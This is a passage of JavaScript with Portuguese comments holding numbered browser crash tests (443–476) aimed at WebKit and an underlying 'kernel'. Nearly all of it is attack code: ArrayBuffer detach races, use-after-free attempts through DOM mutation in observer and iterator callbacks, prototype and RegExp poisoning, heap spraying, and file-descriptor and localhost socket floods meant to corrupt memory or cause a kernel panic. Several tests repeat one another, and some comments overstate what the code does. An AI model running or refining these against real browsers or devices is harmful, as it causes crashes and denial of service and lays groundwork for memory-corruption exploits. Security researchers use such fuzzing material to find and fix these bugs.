        try {
            let detached = false;
            arr.sort((a, b) => {
                if(!detached) {
                    w.postMessage(buf, [buf]); // Neuter instantâneo
                    detached = true;
                }
                return a - b;
            });
            log("SUCCESS: Sort completed (Safe check).");
        } catch(e) { 
            // Se falhar silenciosamente ou travar, é sucesso.
            log("ERR: " + e.message); 
        }
        w.terminate();
    }

    // 443. WebKit: Prototype Poisoning vs JSON.parse
    // Combina: JSON API, Object Properties
    // Objetivo: Corromper estado interno do parser JSON interceptando setters em prototypes básicos.
    function runTest443() {
        log("Init 443: JSON Poisoning...");
        const iframe = document.createElement('iframe');
        document.body.appendChild(iframe);
        const Arr = iframe.contentWindow.Array;
        
        // Poison setter
        Object.defineProperty(Arr.prototype, "0", {
            set: function(v) {
                // Tenta alterar o array sendo construído pelo JSON.parse
                this.length = 0; 
                // Force GC pressure
                const trash = new Uint8Array(1024*1024);
            }
        });
        
        try {
            // JSON string que dispara o setter no índice 0
            const json = '[1, 2, 3, 4]'; 
            // Parse no contexto do iframe envenenado
            const res = JSON.parse(json); 
            log("SUCCESS: JSON parse survived poisoning.");
        } catch(e) { log("ERR: " + e.message); }
        document.body.removeChild(iframe);
    }

    // 444. WebKit: AdoptNode Cross-Document Cycle
    // Combina: DOM Core, Garbage Collection
    // Objetivo: Mover nós entre documentos onde um documento está sendo destruído (GC'd).
    function runTest444() {
        log("Init 444: AdoptNode Cycle...");
        let doc1 = document.implementation.createHTMLDocument("doc1");
        let doc2 = document.implementation.createHTMLDocument("doc2");
        const div = doc1.createElement("div");
        doc1.body.appendChild(div);
        
        const nodes = [];
        for(let i=0; i<1000; i++) nodes.push(doc1.createElement("span"));
        
        try {
            // Ciclo rápido de adoção
            for(let i=0; i<1000; i++) {
                if(i % 2 === 0) doc2.adoptNode(nodes[i]);
                else doc1.adoptNode(nodes[i]);
                
                // Tenta invalidar o documento de origem forçando GC
                if(i === 500) { doc1 = null; const junk = new Array(10000).fill(1); }
            }
            log("SUCCESS: Cross-doc adoption complete.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 445. WebKit: TextDecoder Stream State Corruption
    // Combina: Encoding API, TypedArrays
    // Objetivo: Alimentar o decoder com chunks inválidos (surrogates parciais) enquanto manipula a memória.
    function runTest445() {
        log("Init 445: TextDecoder Stream...");
        if(!window.TextDecoder) return log("Skipped: No TextDecoder");
        
        const decoder = new TextDecoder("utf-8", {fatal: false});
        const chunk = new Uint8Array([0xF0, 0x9F, 0x92]); // Incompleto (4 bytes char)
        
        try {
            for(let i=0; i<5000; i++) {
                // Stream mode: true mantém estado interno no C++
                decoder.decode(chunk, {stream: true});
                if(i % 100 === 0) {
                    // Tenta confundir o buffer interno
                    const big = new Uint8Array(1024*10);
                    decoder.decode(big, {stream: true});
                }
            }
            log("SUCCESS: Decoder stream stressed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 446. Kernel: IPC Ring Topology Refcount Panic
    // Combina: MessageChannel, Circular Reference, Port Closing
    // Objetivo: Criar um anel de portas IPC e fechar aleatoriamente para causar underflow de referência no Kernel.
    function runTest446() {
        log("Init 446: IPC Ring Panic...");
        const size = 100;
        const ring = [];
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            
            // Link Ring: Port1(i) -> Port1(i+1)
            for(let i=0; i<size; i++) {
                const next = (i + 1) % size;
                ring[i].port1.postMessage("Link", [ring[next].port1]);
            }
            
            // Random Destruction
            let k = 0;
            const iv = setInterval(() => {
                const idx = Math.floor(Math.random() * size);
                try { ring[idx].port2.close(); } catch(e){}
                
                if(k++ > 200) {
                    clearInterval(iv);
                    log("SUCCESS: IPC Ring stress finished.");
                }
            }, 2);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 447. Kernel: Blob VFS Fetch-Revoke-Terminate Race
    // Combina: Blob API, Fetch, Worker Lifecycle
    // Objetivo: Race condition no Virtual File System ao ler um arquivo deletado por uma thread moribunda.
    function runTest447() {
        log("Init 447: VFS Race...");
        const b = new Blob([new Uint8Array(1024*1024*5).fill(0xCC)]); // 5MB
        const u = URL.createObjectURL(b);
        
        const wCode = `onmessage=e=>{
            const u = e.data;
            const start = Date.now();
            // Fetch loop agressivo
            while(Date.now() - start < 400) {
                fetch(u).then(r=>r.arrayBuffer()).catch(()=>{});
            }
        }`;
        const wUrl = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const workers = [];
        
        for(let i=0; i<8; i++) {
            const w = new Worker(wUrl);
            w.postMessage(u);
            workers.push(w);
        }
        
        setTimeout(() => {
            URL.revokeObjectURL(u); // Apaga referência VFS
            workers.forEach(w => w.terminate()); // Mata processos leitores
            log("SUCCESS: VFS Race Triggered.");
        }, 100);
    }

    // 448. Kernel: Storage Event vs BroadcastChannel Storm
    // Combina: LocalStorage, BroadcastChannel, Event Loop
    // Objetivo: Saturar filas de mensagem globais do sistema.
    function runTest448() {
        log("Init 448: IPC Storm...");
        const bc = new BroadcastChannel("storm_448");
        const frames = [];
        
        // Criar receptores
        for(let i=0; i<20; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            f.contentWindow.onstorage = () => {}; // Kernel hook
            frames.push(f);
        }
        
        // Emitter loop
        let k = 0;
        const iv = setInterval(() => {
            localStorage.setItem("key"+k, Math.random());
            bc.postMessage(new Uint8Array(1024)); // Payload extra
            
            // Frame churn
            if(k % 10 === 0 && frames.length > 0) {
                const r = frames.pop();
                document.body.removeChild(r);
            }
            if(k++ > 200) {
                clearInterval(iv);
                bc.close();
                log("SUCCESS: IPC Storm finished.");
            }
        }, 5);
    }

    // 449. Kernel: FileReader Descriptor & Slice Exhaustion
    // Combina: File API, Slice, Worker Transfer
    // Objetivo: Esgotar descritores de arquivo criando milhares de slices e transferindo para workers.
    function runTest449() {
        log("Init 449: FD Exhaustion...");
        const b = new Blob([new Uint8Array(1024*1024*10).fill(0xAA)]);
        const readers = [];
        const limit = 3000;
        
        try {
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                // Slice cria novo handle interno
                fr.readAsArrayBuffer(b.slice(i*100, i*100+10));
                readers.push(fr);
                
                // Pressão de thread
                if(i % 500 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCCESS: FD Limit stress complete.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 450. Kernel: Deep History State Serialization Overflow
    // Combina: History API, Structured Clone, Recursion
    // Objetivo: Estourar a stack do Kernel ou corromper o slab allocator durante serialização profunda.
    function runTest450() {
        log("Init 450: Deep History Serialize...");
        let obj = { next: null };
        let curr = obj;
        // Criar lista encadeada profunda
        for(let i=0; i<2000; i++) {
            curr.next = { val: i, buffer: new Uint8Array(128) };
            curr = curr.next;
        }
        
        try {
            // PushState serializa o objeto para o processo Kernel/Browser
            history.pushState(obj, "deep_state", null);
            
            // Tenta modificar o objeto original pós-envio (sanity check, mas history usa clone)
            // Se o kernel usa copy-on-write mal implementado, isso ajuda.
            obj.next = null; 
            
            log("SUCCESS: Deep object pushed to history.");
        } catch(e) { log("ERR: " + e.message); }
    }
// 451. WebKit: Tentativa de acesso a propriedades de um ArrayBuffer transferido (detached)
    function runTest451() {
        log("Init 451: Buffer Detach Race...");
        const code = `self.onmessage=e=>{
            const b=e.data;
            // Tenta acessar buffer recebido
            const v=new Uint8Array(b);
            v[0]=1;
            self.postMessage("done");
        }`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            for(let i=0; i<50; i++) {
                const w = new Worker(u);
                const buf = new ArrayBuffer(1024*1024);
                // Race: Transfere o buffer e tenta ler byteLength imediatamente
                w.postMessage(buf, [buf]);
                const l = buf.byteLength; // Deve ser 0
                if(l > 0) { log("FAIL: Detach failed"); break; }
                // Tenta recriar view sobre buffer detached (deve falhar ou crashar se UAF)
                try { const v = new Uint8Array(buf); v[0]=0xFF; } catch(x){}
                w.terminate();
            }
            log("SUCCESS: Buffer detach logic stressed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 452. WebKit: NodeIterator em árvore DOM mutante com GC forçado
    function runTest452() {
        log("Init 452: NodeIterator UAF...");
        const root = document.createElement('div');
        for(let i=0; i<1000; i++) {
            const s = document.createElement('span');
            s.id = "s"+i;
            root.appendChild(s);
        }
        document.body.appendChild(root);
        const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
        
        try {
            let n = ni.nextNode();
            let k = 0;
            const iv = setInterval(()=>{
                // Remove nós aleatórios que o iterador pode estar referenciando internamente
                if(root.children.length > 0) {
                    const idx = Math.floor(Math.random() * root.children.length);
                    root.children[idx].remove();
                }
                // Avança iterador
                try { n = ni.nextNode(); } catch(x){}
                // Cria pressão de memória para forçar GC em nós removidos
                const junk = new Array(10000).fill({});
                
                if(k++ > 200) {
                    clearInterval(iv);
                    document.body.removeChild(root);
                    log("SUCCESS: Iterator logic survived mutation.");
                }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 453. WebKit: Objeto de histórico com referências cíclicas e getters
    function runTest453() {
        log("Init 453: History Cycle UAF...");
        const makeObj = (id) => {
            const o = { id: id, buffer: new Uint8Array(1024).fill(id) };
            o.self = o; // Ciclo
            return o;
        };
        try {
            let k = 0;
            const iv = setInterval(()=>{
                const state = makeObj(k);
                try {
                    history.pushState(state, "t"+k, null);
                    // Tenta corromper o estado logo após o push
                    state.buffer = null; 
                    state.self = null;
                } catch(x) {}
                
                // Navegação rápida para forçar deserialização
                if(k % 3 === 0) history.back();
                if(k % 6 === 0) history.forward();
                
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCCESS: History serializer stressed.");
                }
            }, 10);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 454. WebKit: DataView em buffer transferido (detached)
    function runTest454() {
        log("Init 454: DataView Neuter...");
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        try {
            const buf = new ArrayBuffer(64);
            const view = new DataView(buf);
            view.setUint8(0, 0xAA);
            
            // Transfere o buffer subjacente
            w.postMessage(buf, [buf]);
            
            // Tenta acessar a view. Se a engine não checar o estado do buffer -> Crash
            // Se checar, deve lançar TypeError
            try {
                const val = view.getUint8(0);
                log("FAIL: Read from detached view: " + val);
            } catch(e) {
                // Erro esperado, mas queremos testar a estabilidade sob repetição
            }
            
            const buf2 = new ArrayBuffer(128);
            const view2 = new DataView(buf2);
            w.postMessage(buf2, [buf2]);
            setTimeout(()=>w.terminate(), 100);
            log("SUCCESS: View checks executed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 455. WebKit: Fetch em Blob URL com revogação e navegação de Iframe
    function runTest455() {
        log("Init 455: Blob/Iframe Race...");
        const b = new Blob(["<script>window.parent.postMessage('ping','*')<\/script>"], {type:'text/html'});
        const u = URL.createObjectURL(b);
        const iframes = [];
        
        const i = setInterval(() => {
            if(iframes.length < 10) {
                const f = document.createElement('iframe');
                f.src = u;
                document.body.appendChild(f);
                iframes.push(f);
            } else {
                // Race: Revoga URL e remove iframes enquanto carregam
                URL.revokeObjectURL(u);
                while(iframes.length > 0) document.body.removeChild(iframes.pop());
                clearInterval(i);
                log("SUCCESS: VFS/Loader race triggered.");
            }
        }, 10);
    }

    // 456. Kernel: Cadeia profunda de MessagePorts com destruição parcial
    function runTest456() {
        log("Init 456: Port Chain Refcount...");
        const root = new MessageChannel();
        let curr = root.port1;
        const chain = [];
        // Cria 1000 canais encadeados
        for(let i=0; i<1000; i++) {
            const next = new MessageChannel();
            curr.postMessage("link", [next.port1]);
            chain.push(curr);
            curr = next.port2;
        }
        
        // Destrói aleatoriamente para fragmentar
        let k = 0;
        const iv = setInterval(()=>{
            for(let j=0; j<10; j++) {
                const idx = Math.floor(Math.random() * chain.length);
                if(chain[idx]) {
                    try{chain[idx].close();}catch(x){}
                    chain[idx] = null;
                }
            }
            if(k++ > 50) {
                clearInterval(iv);
                root.port2.close();
                log("SUCCESS: IPC Chain stress complete.");
            }
        }, 5);
    }

    // 457. Kernel: BroadcastChannel vs Storage Event List Corruption
    function runTest457() {
        log("Init 457: Event List Corruption...");
        const bc = new BroadcastChannel("ch_457");
        const frames = [];
        for(let i=0; i<30; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            f.contentWindow.onstorage = () => {}; // Registra listener no kernel
            frames.push(f);
        }
        
        let k = 0;
        const iv = setInterval(()=>{
            // Gera tráfego broadcast e storage simultâneo
            bc.postMessage("msg");
            localStorage.setItem("k"+k, Math.random());
            
            // Remove frames (e listeners) durante o processamento
            if(k % 5 === 0 && frames.length > 0) {
                const r = frames.pop();
                document.body.removeChild(r);
            }
            
            if(k++ > 150) {
                clearInterval(iv);
                bc.close();
                log("SUCCESS: Global listener list stressed.");
            }
        }, 5);
    }

    // 458. Kernel: File Descriptor Exhaustion via Slice
    function runTest458() {
        log("Init 458: FD Exhaustion...");
        const b = new Blob([new Uint8Array(1024*1024*5).fill(0xAA)]);
        const readers = [];
        // Tenta abrir 3000 descritores (limite comum é baixo)
        const limit = 3000;
        try {
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                // Slice força novo handle
                fr.readAsArrayBuffer(b.slice(i*10, i*10+5));
                readers.push(fr);
                
                // Adiciona churn de threads
                if(i % 500 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCCESS: FD Limit hit.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 459. Kernel: IPC Pipe Overflow Zombie Transfer
    function runTest459() {
        log("Init 459: Pipe Overflow Zombie...");
        const ch = new MessageChannel();
        const load = new Uint8Array(1024*32).fill(0xBB); // 32KB
        const wCode = `onmessage=e=>{e.data.close()}`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        
        let count = 0;
        const iv = setInterval(()=>{
            // Enche o pipe
            for(let k=0; k<50; k++) {
                ch.port1.postMessage(load);
                count++;
            }
            // Quando cheio, transfere o receiver para thread e mata a thread
            if(count > 3000) {
                clearInterval(iv);
                const w = new Worker(u);
                w.postMessage(ch.port2, [ch.port2]);
                setTimeout(() => {
                    w.terminate(); // Mata processo dono da porta cheia
                    ch.port1.close();
                    log("SUCCESS: Zombie pipe created.");
                }, 100);
            }
        }, 5);
    }

    // 460. Kernel: Recursive Worker Scheduler Cleanup Race
    function runTest460() {
        log("Init 460: Scheduler Race...");
        const code = `self.onmessage=e=>{
            const d=e.data;
            if(d>0){
                const w=new Worker(self.location.href);
                w.postMessage(d-1);
                // Race: Mata o filho logo após criação
                setTimeout(()=>w.terminate(), Math.random()*20);
            } else {
                // Busy wait
                const s=Date.now(); while(Date.now()-s<100);
            }
        }`;
        const b = new Blob([code],{type:'text/javascript'});
        // Workaround para self location
        const u = URL.createObjectURL(b);
        const boot = `self.onmessage=e=>{const w=new Worker('${u}'); w.postMessage(20);}`;
        const uBoot = URL.createObjectURL(new Blob([boot],{type:'text/javascript'}));
        
        try {
            const root = new Worker(uBoot);
            root.postMessage("start");
            setTimeout(() => {
                root.terminate();
                log("SUCCESS: Thread tree collapsed.");
            }, 1000);
        } catch(e) { log("ERR: " + e.message); }
    }
 // 461. WebKit: TextEncoder EncodeInto vs Buffer Detach Race
    // Alvo: Encoding API (C++)
    // Mecânica: Tenta escrever em um Uint8Array enquanto transfere seu buffer subjacente para um Worker.
    function runTest461() {
        log("Init 461: Encoder Detach Race...");
        const buf = new Uint8Array(1024 * 1024 * 2);
        const encoder = new TextEncoder();
        const str = "A".repeat(1024 * 1024); // Payload grande para demorar
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        
        try {
            // Race condition: JS engine pode validar o buffer antes da transferência
            // mas o loop C++ de escrita pode continuar após o detach.
            const iv = setInterval(() => {
                if(buf.byteLength > 0) {
                    // Transfere o buffer (detach instantâneo)
                    w.postMessage(buf.buffer, [buf.buffer]);
                    try {
                        // Tenta escrever no buffer agora inválido/transferido
                        encoder.encodeInto(str, buf);
                    } catch(e) {}
                } else {
                    clearInterval(iv);
                    w.terminate();
                    log("SUCCESS: Detach race logic executed.");
                }
            }, 0);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 462. WebKit: RegExp Exec Side-Effect Memory Corruption
    // Alvo: JavaScriptCore RegExp Engine
    // Mecânica: RegExp customizado que modifica a string de entrada durante a execução do match.
    function runTest462() {
        log("Init 462: RegExp Side-Effect...");
        const magic = /./g;
        let str = "test_string_to_corrupt";
        
        // Poisoning do método exec
        magic.exec = function(s) {
            // Efeito colateral: Altera a representação da string na memória
            // Força a string a mudar de "Rope" para "Flattened" ou libera a memória original
            str = "A".repeat(100000); 
            // Retorna match fake para confundir o motor
            return RegExp.prototype.exec.call(this, s); 
        };
        
        try {
            // String.replace chama exec internamente em loop
            // Se o motor mantiver ponteiro para a string antiga -> UAF
            "".replace.call(str, magic, "replacement");
            log("SUCCESS: RegExp engine survived modification.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 463. WebKit: TreeWalker AcceptNode DOM Mutation UAF
    // Alvo: DOM Traversal
    // Mecânica: TreeWalker percorre o DOM. O filtro customizado remove o nó que está sendo visitado.
    function runTest463() {
        log("Init 463: TreeWalker Mutation...");
        const root = document.createElement('div');
        for(let i=0; i<100; i++) root.appendChild(document.createElement('span'));
        document.body.appendChild(root);
        
        const tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
            acceptNode: function(node) {
                if(node.tagName === 'SPAN') {
                    // Remove o nó atual durante a filtragem
                    node.remove();
                    // Aloca memória para tentar ocupar o espaço liberado
                    const junk = new Uint8Array(1024).fill(0xCC);
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_SKIP;
            }
        });
        
        try {
            // nextNode precisa lidar com o nó atual desaparecendo
            let n = tw.nextNode();
            while(n) n = tw.nextNode();
            log("SUCCESS: TreeWalker safe exit.");
        } catch(e) { log("ERR: " + e.message); }
        if(root.parentNode) root.remove();
    }

    // 464. WebKit: HTMLMediaElement TextTrack Cue List Poisoning
    // Alvo: Media Subsystem
    // Mecânica: Adiciona milhares de cues (legendas) e manipula a lista durante o evento de cuechange.
    function runTest464() {
        log("Init 464: TextTrack Poisoning...");
        const v = document.createElement('video');
        const track = v.addTextTrack("subtitles");
        track.mode = "hidden"; // Processa eventos mas não renderiza
        
        try {
            for(let i=0; i<2000; i++) {
                const cue = new VTTCue(i/10, (i/10)+0.1, "text");
                track.addCue(cue);
            }
            
            track.oncuechange = () => {
                // Remove cues aleatoriamente durante o evento de mudança
                // Pode causar inconsistência nos índices internos da lista C++
                if(track.cues.length > 0) {
                    track.removeCue(track.cues[0]);
                }
            };
            
            // Simula playback (apenas avanço de tempo lógico)
            // Não precisa de vídeo real, apenas disparar eventos
            let t = 0;
            const iv = setInterval(() => {
                // Hack para disparar eventos internos de tempo sem decode real
                // Isso força o MediaController a verificar activeCues
                if(track.cues && track.cues.length > 0) {
                    const c = track.cues[0];
                    c.startTime = Math.random(); 
                    c.endTime = Math.random();
                }
                if(t++ > 100) { clearInterval(iv); log("SUCCESS: Track list stressed."); }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 465. WebKit: Selection API Range Collapse vs Node Removal
    // Alvo: Editing / Selection
    // Mecânica: Modifica a seleção atual enquanto remove os nós selecionados.
    function runTest465() {
        log("Init 465: Selection UAF...");
        const div = document.createElement('div');
        div.contentEditable = true;
        div.innerHTML = "<b>A</b><i>B</i><u>C</u>".repeat(50);
        document.body.appendChild(div);
        
        const sel = window.getSelection();
        const range = document.createRange();
        
        try {
            const b = div.querySelector('b');
            const u = div.querySelector('u');
            range.setStart(b, 0);
            range.setEnd(u, 1);
            sel.removeAllRanges();
            sel.addRange(range);
            
            // Operação que lê a seleção e modifica o DOM simultaneamente
            // document.execCommand é síncrono e complexo
            const obs = new MutationObserver(() => {
                // Callback síncrono no meio da edição?
                div.innerHTML = ""; // Nuke DOM
            });
            obs.observe(div, {childList: true, subtree: true});
            
            // Dispara formatação que vai ativar o MutationObserver no meio do processo
            document.execCommand('bold'); 
            
            log("SUCCESS: Selection logic complete.");
        } catch(e) { log("ERR: " + e.message); }
        if(div.parentNode) div.remove();
    }

    // 466. Kernel: Blob Slice Recursion Depth Exhaustion
    // Alvo: Kernel VFS (Virtual File System)
    // Mecânica: Cria um Blob que é um slice de um slice de um slice... N vezes.
    // O Kernel precisa rastrear a cadeia de offsets. Cadeias profundas estouram a pilha do kernel ou limite de ref.
    function runTest466() {
        log("Init 466: Blob Slice Recursion...");
        let b = new Blob([new Uint8Array(1024).fill(0xAA)]);
        
        try {
            // Cria cadeia de referência de 5000 níveis
            for(let i=0; i<5000; i++) {
                // Slice(0, size) cria nova referência VFS apontando para a anterior
                b = b.slice(0, b.size); 
            }
            
            // Força o kernel a resolver a cadeia lendo o blob final
            const fr = new FileReader();
            fr.readAsArrayBuffer(b);
            fr.onload = () => log("SUCCESS: Slice chain resolved.");
            fr.onerror = () => log("SUCCESS: Slice chain failed (Limit hit).");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 467. Kernel: XHR Socket Handle Leak & Localhost Flood
    // Alvo: TCP Stack / File Descriptors
    // Mecânica: Abre milhares de conexões XHR para localhost sem fechar/abortar, esgotando handles de socket.
    function runTest467() {
        log("Init 467: Socket Leak...");
        const reqs = [];
        try {
            let i = 0;
            const iv = setInterval(() => {
                // Tenta abrir 100 conexões por tick
                for(let j=0; j<100; j++) {
                    const xhr = new XMLHttpRequest();
                    // Porta aleatória para evitar cache/pool sharing agressivo
                    xhr.open("GET", "http://127.0.0.1:" + (Math.floor(Math.random()*60000)+1024), true);
                    try { xhr.send(); } catch(e){} // Envia e esquece (leak)
                    reqs.push(xhr);
                }
                
                if(i++ > 50) { // ~5000 sockets
                    clearInterval(iv);
                    // Libera referências JS para forçar GC e fechar sockets em massa (tempestade de close)
                    reqs.length = 0; 
                    log("SUCCESS: Socket flood dispatched.");
                }
            }, 10);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 468. Kernel: MessagePort Queue Transfer to Zombie Thread
    // Alvo: IPC Subsystem
    // Mecânica: Enche um MessageChannel, transfere a porta de leitura para um Worker e mata o Worker.
    // O Kernel fica com mensagens não entregues associadas a um processo morto.
    function runTest468() {
        log("Init 468: Zombie Queue Transfer...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 64).fill(0xBB); // 64KB
        
        try {
            let count = 0;
            // Enche o buffer do kernel pipe
            const fill = setInterval(() => {
                ch.port1.postMessage(payload);
                if(count++ > 2000) { // ~128MB
                    clearInterval(fill);
                    
                    // Transfere a "bomba" para um worker suicida
                    const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{self.close()}"],{type:'text/javascript'})));
                    w.postMessage(ch.port2, [ch.port2]);
                    
                    // Cleanup local
                    ch.port1.close();
                    setTimeout(() => w.terminate(), 100); // Double tap
                    log("SUCCESS: Queue transferred to zombie.");
                }
            }, 1);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 469. Kernel: History State Deep Clone Kernel Stack Overflow
    // Alvo: Serializer (Structured Clone)
    // Mecânica: Serializa um objeto JS absurdamente aninhado via History API.
    // Se a implementação de serialização usar recursão na pilha C/Kernel, causa Panic.
    function runTest469() {
        log("Init 469: Deep Clone Stack Overflow...");
        
        let root = { next: null };
        let curr = root;
        // Cria profundidade de 10.000 (normalmente estoura pilhas padrão de 1MB/2MB)
        for(let i=0; i<10000; i++) {
            curr.next = { val: i, buffer: new Uint8Array(16) };
            curr = curr.next;
        }
        
        try {
            // PushState dispara o algoritmo de structured clone
            history.pushState(root, "deep_stack", null);
            log("SUCCESS: Deep object serialized.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 470. Kernel: VFS Lookup Race via Worker Fetch & Revoke
    // Alvo: VFS Lookup Locking
    // Mecânica: Múltiplas threads (Workers) tentando acessar um Blob URL enquanto a thread principal o revoga.
    function runTest470() {
        log("Init 470: VFS Fetch Race...");
        const b = new Blob([new Uint8Array(1024 * 1024 * 5).fill(0xCC)]); // 5MB
        const u = URL.createObjectURL(b);
        
        const wCode = `onmessage=e=>{
            const u = e.data;
            // Loop agressivo de leitura
            const start = Date.now();
            while(Date.now() - start < 500) {
                fetch(u).then(r => r.arrayBuffer()).catch(()=>{});
            }
        }`;
        
        const uW = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const workers = [];
        
        try {
            // Inicia enxame de leitores
            for(let i=0; i<12; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                workers.push(w);
            }
            
            // Revoga o handle no meio do acesso concorrente
            setTimeout(() => {
                URL.revokeObjectURL(u);
                // Mata os workers abruptamente para deixar descritores pendentes
                setTimeout(() => workers.forEach(w => w.terminate()), 50);
                log("SUCCESS: VFS race dispatched.");
            }, 100);
        } catch(e) { log("ERR: " + e.message); }
    }
// 471. WebKit: IntersectionObserver Node Removal UAF
    // Mecânica: Modifica a árvore DOM dentro do callback do observador, tentando confundir o cálculo de geometria.
    function runTest471() {
        log("Init 471: IntersectionObserver UAF...");
        const root = document.createElement('div');
        root.style.height = "100px"; root.style.overflow = "scroll";
        const target = document.createElement('div');
        target.style.height = "200px";
        root.appendChild(target);
        document.body.appendChild(root);

        const io = new IntersectionObserver((entries) => {
            // Callback assíncrono
            // Remove o target e o root do DOM imediatamente
            root.remove();
            target.remove();
            // Heap spray para tentar ocupar o espaço do objeto de layout destruído
            const spray = new Array(5000).fill(1.1);
            // Tenta forçar recálculo de layout em nós desconectados
            const h = target.getBoundingClientRect().height; 
        });
        
        io.observe(target);
        // Força scroll para disparar o observer
        setTimeout(() => root.scrollTop = 50, 10);
        log("SUCCESS: Observer triggered with removal.");
    }

    // 472. WebKit: Worker Transfer ArrayBuffer Getter Race
    // Mecânica: Define um getter malicioso que transfere o buffer no momento que o motor tenta lê-lo.
    function runTest472() {
        log("Init 472: Transfer Getter Race...");
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        const buf = new ArrayBuffer(1024 * 1024);
        
        const obj = {
            get buffer() {
                // No momento que a engine pede o buffer, nós o transferimos (detach)
                w.postMessage(buf, [buf]);
                return buf;
            }
        };

        try {
            // TypedArray constructor tenta ler a propriedade 'buffer' e seu byteLength
            // Se o detach ocorrer entre a leitura da ref e a leitura do tamanho -> Crash
            const view = new Uint8Array(obj.buffer);
            log("FAIL: View created on detached buffer (Safe).");
        } catch(e) {
            log("SUCCESS: Race attempted: " + e.message);
        }
        w.terminate();
    }

    // 473. WebKit: Range Boundary SplitText Mutation Race
    // Mecânica: Range aponta para nó de texto. MutationObserver divide o texto, invalidando os limites do Range.
    function runTest473() {
        log("Init 473: Range SplitText...");
        const p = document.createElement('p');
        p.firstChild && p.firstChild.remove();
        const t = document.createTextNode("AAAAABBBBB");
        p.appendChild(t);
        document.body.appendChild(p);

        const range = document.createRange();
        range.setStart(t, 2);
        range.setEnd(t, 8);

        const mo = new MutationObserver(() => {
            // Dividir o nó de texto invalida os offsets do Range
            // O Range deve ser atualizado automaticamente, mas em loops complexos isso falha
            t.splitText(5); 
            p.normalize(); // Tenta re-unir, confundindo ponteiros
        });
        mo.observe(p, {childList: true, characterData: true, subtree: true});

        // Trigger: Modificar dados para disparar MO
        t.data = "CCCCCDDDDD"; 
        
        try {
            const ext = range.extractContents();
            log("SUCCESS: Range operation survived split.");
        } catch(e) { log("ERR: " + e.message); }
        p.remove();
    }

    // 474. WebKit: Canvas2D Zero-Size Pattern Heap Corruption
    // Mecânica: Criar pattern de canvas 0x0. Historicamente causa divisão por zero ou alocação nula.
    function runTest474() {
        log("Init 474: Canvas Pattern...");
        const c1 = document.createElement('canvas');
        c1.width = 0; c1.height = 0; // Source vazio
        const c2 = document.createElement('canvas');
        c2.width = 100; c2.height = 100;
        const ctx = c2.getContext('2d');

        try {
            // createPattern com source 0x0 pode retornar ponteiro inválido
            const pat = ctx.createPattern(c1, 'repeat');
            if(pat) {
                ctx.fillStyle = pat;
                // Usar o pattern inválido para renderização
                ctx.fillRect(0, 0, 100, 100);
            }
            log("SUCCESS: Zero-size pattern handled.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 475. WebKit: Crypto API Detached Buffer Syscall
    // Mecânica: Passar TypedArray para crypto.getRandomValues e detachar o buffer no mesmo tick.
    function runTest475() {
        log("Init 475: Crypto Detach...");
        const buf = new Uint8Array(65536);
        const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));

        try {
            // Define propriedade que dispara o detach ao ser acessada (se a engine ler props do objeto)
            // Ou apenas race bruta
            const race = setInterval(() => {
                if(buf.byteLength > 0) {
                    // Chamada de sistema
                    try { window.crypto.getRandomValues(buf); } catch(x){}
                    // Detach simultâneo
                    w.postMessage(buf.buffer, [buf.buffer]);
                } else {
                    clearInterval(race);
                    w.terminate();
                    log("SUCCESS: Crypto race logic executed.");
                }
            }, 0);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 476. Kernel: Recursive Port Object Serialization Stack Overflow
    // Mecânica: Criar objeto profundamente aninhado contendo MessagePorts para estourar a stack do Kernel IPC.
    function runTest476() {
        log("Init 476: Recursive Port Serialize...");
        const ch = new MessageChannel();
        let deep = { port: ch.port1, next: null };
        let curr = deep;
        
        // Profundidade agressiva
        for(let i=0; i<1000; i++) {
            curr.next = { port: null, next: null }; // Payload misto
            curr = curr.next;
        }

        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        
        try {
            // O algoritmo de clonagem estruturada precisa percorrer isso.
            // Se passar o limite de recursão do WebKit mas não do Kernel, crasha o Kernel.
            w.postMessage(deep, [ch.port1]);
